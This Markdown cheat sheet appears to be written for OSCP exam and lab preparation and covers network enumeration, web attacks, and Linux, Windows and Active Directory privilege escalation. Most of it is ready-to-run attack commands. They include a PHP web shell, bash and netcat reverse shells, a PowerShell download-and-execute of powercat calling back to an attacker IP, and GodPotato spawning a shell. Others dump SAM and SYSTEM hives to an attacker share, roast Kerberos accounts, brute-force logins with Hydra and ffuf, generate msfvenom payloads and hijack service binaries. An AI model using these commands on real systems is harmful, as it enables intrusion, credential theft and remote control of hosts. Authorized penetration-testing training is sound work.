# OSCP-cheatsheet

If you get a passable set on the exam, this should have you covered. A lot of it I compiled while working through the labs, some of it is gotcha reminders for myself, and I took whatever I considered useful for myself from this [amazing guide by John Ford on Medium](https://medium.com/@redefiningreality/your-bs-less-guide-to-acing-oscp-4eccaf497410). Keep in mind this doesn't really cover the absolute basics like file transfers or what to do with Mimikatz, crackmapexec/netexec and the like. 

- [Initial scans](#initial-scans)
    + [MIB Identifiers](#mib-identifiers)
- [Web](#web)
- [General Reminders](#general-reminders)
  * [Reverse Shells](#reverse-shells)
    + [Powercat](#powercat)
    + [Stabilise shell](#stabilise-shell)
  * [HTTP Upload script](#http-upload-script)
  * [Port Forwarding with Chisel](#port-forwarding-with-chisel)
- [Active Directory](#active-directory)
  * [after internal access credentials](#after-internal-access-credentials)
    + [Roasting](#roasting)
    + [ldapdomaindump](#ldapdomaindump)
    + [bloodhound-python](#bloodhound-python)
  * [Git](#git)
  * [GodPotato](#godpotato)
  * [Transfer sam/system/security](#transfer-sam-system-security)
- [Basic Linux PrivEsc](#basic-linux-privesc)
  * [SUID file/capability](#suid-file-capability)
  * [sudo](#sudo)
  * [processes](#processes)
  * [Internal services to port forward](#internal-services-to-port-forward)
  * [cron jobs](#cron-jobs)
- [Basic Windows PrivEsc](#basic-windows-privesc)
  * [privileges](#privileges)
    + [RunAs](#runas)
    + [UAC Bypass](#uac-bypass)
  * [PowerShell History](#powershell-history)
  * [Files](#files)
  * [Enumeration Scripts](#enumeration-scripts)
  * [Windows Services](#windows-services)
    + [Binary Hijacking](#binary-hijacking)
    + [DLL Hijacking](#dll-hijacking)
    + [Unquoted Service Paths](#unquoted-service-paths)
  * [Scheduled Tasks](#scheduled-tasks)

### Initial scans

```shell
nmap -Pn -p- --min-rate 1000 -v <IP_ADRESS>

nmap -Pn -sU --top-ports 100 --min-rate 1000 -v <IP_ADRESS>

# First command to try if you find SNMP
snmpwalk -v2c -c public <IP_ADRESS> NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v2c -c public # <MIB identifier, optional>

nmap -Pn -sCV -p <PORTS> -v <IP_ADRESS>

```
##### MIB Identifiers

- System Processes: 1.3.6.1.2.1.25.1.6.0
- Running Programs: 1.3.6.1.2.1.25.4.2.1.2
- Processes Paths: 1.3.6.1.2.1.25.4.2.1.4
- Storage Units: 1.3.6.1.2.1.25.2.3.1.4
- Software Names: 1.3.6.1.2.1.25.6.3.1.2
- User Accounts: 1.3.6.1.4.1.77.1.2.25
- TCP Local Ports: 1.3.6.1.2.1.6.13.1.3
### Web

Run feroxbuster on any web pages. (Or gobuster, ffuf, whatever your favourite tool is.) Only increase the depth if you suspect something more.

```shell

feroxbuster -u <IP/domain> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --depth 1

# Other lists to try:
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

```

Check Wappalyzer, run `wpscan` if you find wordpress and check the plugins.

```shell
wpscan --url <https(s)//IP/domain> --enumerate p --plugins-detection aggressive
```

Find out the website framework and google with the word exploit.

Search for exploits by page name as well, it may be a known application, even if it doesn't look like it.

Ffuf or Hydra for bruteforcing website logins. Capture the request with Burp. Browse through Burp proxy with intercept disabled.

```shell
# Replace the word/paremeter you want to bruteforce with FUZZ in login.req  
ffuf -request login.req -request-proto http -w <wordlist>  
# Replace USER in login.req with user in userlist and PASS with password in passlist  
ffuf -request login.req -request-proto http -mode <pitchfork/clusterbomb> -w <userlist>:USER -w <passlist>:PASS

# You could also use Hydra instead

hydra -l admin -P /usr/share/wordlists/rockyou.txt -f <IP> -s <port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<failure-sring>"

```

- **SQL injection** with MSSQL xp_cmdshell or MySQL INTO OUTFILE - `union or error (verbose) based`  - perspectiverisk cheat sheets: [MySQL](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/), [MSSQL](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
- any login panel try some basic creds like `admin:password`, `admin:admin`, name of the site, and **default creds** for the site framework found online. 
- if you get into an admin panel, first thing to look for is a **file upload feature** - assuming PHP, try test.php, test.pHP, test.phtml, test.php5, test.phar

```php
# Can use this simple shell or find one of your own.
<?php system($_GET["cmd"]); ?>
```

Can use the **PHP Ivan Sincek** one from [revshells.com](https://www.revshells.com), might get you *access as the service user* in Windows. Service users have SeImpersonatePrivilege.

With directory traversal, check alternatives for id_rsa such as `id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa`.

If you suspect directory traversal/LFI, but can't make it work, throw ffuf and these lists at it:

https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt
https://github.com/emadshanab/LFI-Payload-List

```shell
# Run first without -fs to figure out what response size you need to filter.
ffuf -u http(s)://<IP>/<proper page/parameter>=FUZZ -w dirTraversal-nix.txt -fs 0

ffuf -u http(s)://<IP>/<proper page/parameter>=FUZZ -w LFI-payloads.txt -fs 0
```
### General Reminders

Connect with Netcat to any weird open ports and try running `help` or playing around.

Check for **FTP anonymous login** and **SMB null session** (no creds, Guest without password).

Try anything that even remotely resembles a password in files. Be mindful of any possible lockout policy for AD.

Check *environment variables* for credentials.

Run **linpeas and winpeas**, depending on the host, keep an eye out for anything that's out of place and wouldn't be on the machine by default.

If it's not working when it seems like it should be, just revert the machine.

Try different protocols with `netexec/crackmapexec` - **smb, winrm, rdp**, **mssql**, **ssh**. Check for winrm and rdp access even for random low-level users. Always check with and without `--local-auth`. 

Always check user privileges with `whoami /priv` and `sudo -l`.

Check all directories of current user, `C:\`, look for .txt files, look for old backups of SAM and SYSTEM. 

Try username as password. Try capital first letter.
#### Reverse Shells

Feel free to use [revshells.com](https://www.revshells.com) to save yourself time.

Always try **ports 80,443,445 first** to avoid getting blocked by firewall.

- when getting a reverse shell on Windows, use nc.exe because it’s the most stable. First command to upload, second command to get shell
- on Linux, first try

```shell
/bin/bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1"
```

- then `upload netcat` if that doesn’t work - don’t try to use the target’s built in netcat since it probably won’t have the -e option.

Use this to catch shells, as it will give you an interactive shell for Windows targets right off the bat:

```shell
rlwrap -cAr nc -nvlp 1234
```
##### Powercat

```shell
powershell -e IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.151/powercat.ps1");powercat -c 192.168.45.151 -p 1234 -e powershell 
```
##### Stabilise shell

```shell

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl + Z 
stty raw -echo; fg

```
#### HTTP Upload script 

If all else fails when transferring files from the victim to the attacker machine.

```powershell

IEX(IWR http://IP:9999/PSUpload.ps1 -UseBasicParsing); Invoke-FileUpload -Uri http://IP:9998/upload -File <name>

```

https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
#### Port Forwarding with Chisel

For your own sanity, just use ligolo-ng for pivoting, make your life easier, but it still doesn't have port forwarding so you might need chisel:

```shell
# Attacker machine
chisel server -p 9999 --reverse
# Victim machine
chisel client <IP>:9999 R:8000:127.0.0.1:8000
```
### Active Directory

Find credentials. Use credentials. Everything from the Web and Windows PrivEsc sections can apply here.

Try different protocols with netexec - **smb, winrm, rdp**. Check for winrm and rdp access even for random low-level users.

Use `--continue-on-success`. Check `--shares`.
#### after internal access credentials
##### Roasting 

```shell
# AS-REP roasting  
GetNPUsers.py <domain>/<user>:<password> -dc-ip <ip> -request -format john -outputfile hashes.txt  
# Kerberoasting  
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip> -request -outputfile hashes.txt
```
##### ldapdomaindump

```shell
# check get_users_by_group file in Firefox to see all users, their descriptions, and any domain admins

ldapdomaindump ldap://<dc> -u '<domain>\<user>' -p <password> -o <dir>
```

##### bloodhound-python

```shell
bloodhound-python -c All -u user -p 'Password' -dc dc01.domain.local -d domain.local -ns <DC IP> --dns-timeout 30 --dns-tcp 
```
#### Git

Git-dumper if in web.

```shell
# Dump from web
git-dumper http://nicepage.com/.git ./directory 

# Executed in git directory
git log
git show <commit id>
git diff <commit 1> <commit 2>

```
#### GodPotato

Most reliable potato for SeImpersonate.

```powershell
# Get files in C:\Windows\Temp
wget http://192.168.45.151:445/GodPotato4.exe -o GodPotato.exe

wget http://192.168.45.151:445/nc64.exe -o nc.exe

.\GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.151 445"

```
#### Transfer sam/system/security

```powershell
python3 http-upload.py 80

reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"

smbserver.py -smb2support "share" .

copy C:\Windows\Temp\sam.save \\192.168.45.250\share\sam.save
copy C:\Windows\Temp\sam.save \\192.168.45.250\share\system.save
copy C:\Windows\Temp\sam.save \\192.168.45.250\share\security.save

secretsdump.py -sam sam.save -system system.save -security security.save LOCAL    

```
### Basic Linux PrivEsc

Recursively search the contents of files in a directory:

```shell
grep -Horn <text> <dir>
```

To print out the whole line in each file instead of just the line number, remove the vowel (`grep -Hrn`).

Type `id` and check the user groups.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe

Run **linpeas**, keep an eye out for anything that's out of place and wouldn't be on the machine by default.
#### SUID file/capability 

then [GTFObins](https://gtfobins.github.io)

```shell
find / -perm -u=s 2>/dev/null  
find / -perm -g=s 2>/dev/null  
getcap -r / 2>/dev/null

```
#### sudo

`sudo -l`

then [GTFObins](https://gtfobins.github.io)
#### processes

Processes - look for ones running as root or another user

```shell
# Some prettier alternatives to ps aux  
ps fauxww  
ps -ewwo pid,user,cmd --forest
```

Run **pspy**.
#### Internal services to port forward

```shell
# All connections  
netstat -antup  
# Listening connections  
netstat -plunt
```

**Common directories**: check `/`, `/home` and *nested user directories*, and `/opt`. Use `ls -lah` to list hidden things.
#### cron jobs

```shell
# look for anything unusual

grep "CRON" /var/log/syslog
cat /etc/crontab  
ls /var/spool/cron  
ls /etc/cron.*

# also repeat these replacing cron with anacron
```

If there’s a website running, always **look for a config file with creds** — this applies to Windows too (for wordpress it’s `wp-config.php` for example)
### Basic Windows PrivEsc

```powershell
powershell -ep bypass
```

**64-bit Windows either runs processes in 32-bit or 64-bit mode**.

```powershell
# In 32-bit mode WinPEASany might not show everything.
[System.Environment]::Is64BitProcess

# If it says false you can switch to 64-bit by running
C:\Windows\sysNative\cmd.exe

```

Always run the 64-bit versions of any binary (eg. WinPEAS or mimikatz) when on a 64-bit Windows.
#### privileges

```shell
whoami /priv

whoami /group

# SeImpersonate means GodPotato, SweetPotato for a more stable shell
```

Try [this](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe) if you have `SeRestorePrivilege`.

```shell
SeRestoreAbuse.exe "cmd /c ..."
```

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
##### RunAs

**RunasCs** is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin _runas.exe_ that solves some limitations.

https://github.com/antonioCoco/RunasCs
##### UAC Bypass

if you’re in the Administrators group, upload nc.exe. Modify `$program` in the script to spawn a netcat reverse shell.

https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
#### PowerShell History

```powershell
Get-History  
(Get-PSReadlineOption).HistorySavePath  
type <path>
```
#### Files

```Shell

Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

```

Check `C:\` for any weird folders.
#### Enumeration Scripts

Two most important privesc scripts: [**PrivescCheck.ps1**](https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1) and [**winPEASany.exe**](https://github.com/carlospolop/PEASS-ng/releases)

- **PrivescCheck** - look at every section that says KO in the table at the end except the missing patches one. It’ll catch unquoted service paths, service binaries you can overwrite, scheduled tasks, etc.

```powershell
# One-liner to bypass execution policy, import and run the script.
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

-  WinPEAS will find some things PrivescCheck won’t like autologon creds. Don’t spend too much time on it just look for anything really obvious that stands out.
#### Windows Services

All of this likely would have been caught with PrivescCheck, but if you want to double-check manually.
##### Binary Hijacking

```powershell

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\xampp\apache\bin\httpd.exe"

# Replace with adduser script, edit adduser.c if you have to, compile 

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Alternatively, msfvenom payload, don't use meterpreter + use a stageless payload

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f exe -o payload.exe

# Check Startup type
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

# With shutdown privlege
shutdown /r /t 0 

# Or stop and start / restart the service.

```
##### DLL Hijacking

```powershell

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls .\Documents\BetaServ.exe

```
##### Unquoted Service Paths

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Run from cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
# check with icacls, replace, restart or stop/start service

```
#### Scheduled Tasks

```powershell
# Pay attention to last runtime and next runtime
schtasks /query /fo LIST /v 

# Backup and replace binary
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\

```

